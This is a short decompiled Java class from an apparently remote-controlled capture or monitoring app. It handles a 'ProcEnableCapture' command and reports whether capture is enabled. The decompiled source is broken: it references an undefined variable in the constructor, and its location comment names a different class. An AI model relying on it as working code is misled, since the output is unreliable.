package com.vvt.remotecommand.processor.misc;

import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.b;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;

public class c
  extends com.vvt.remotecommand.processor.a
{
  public c(com.vvt.remotecontrol.a parama)
  {
    super(parama, localRemoteFunction);
  }
  
  protected String a()
  {
    return "ProcEnableCapture";
  }
  
  protected String b()
  {
    Object localObject = b.b(h());
    boolean bool = ((RmtCtrlOutputSettings)localObject).isCaptureEnabled();
    String str = "Capture option is %s";
    int i = 1;
    Object[] arrayOfObject = new Object[i];
    if (bool) {}
    for (localObject = "enabled";; localObject = "disabled")
    {
      arrayOfObject[0] = localObject;
      return String.format(str, arrayOfObject);
    }
  }
  
  protected boolean c()
  {
    return false;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */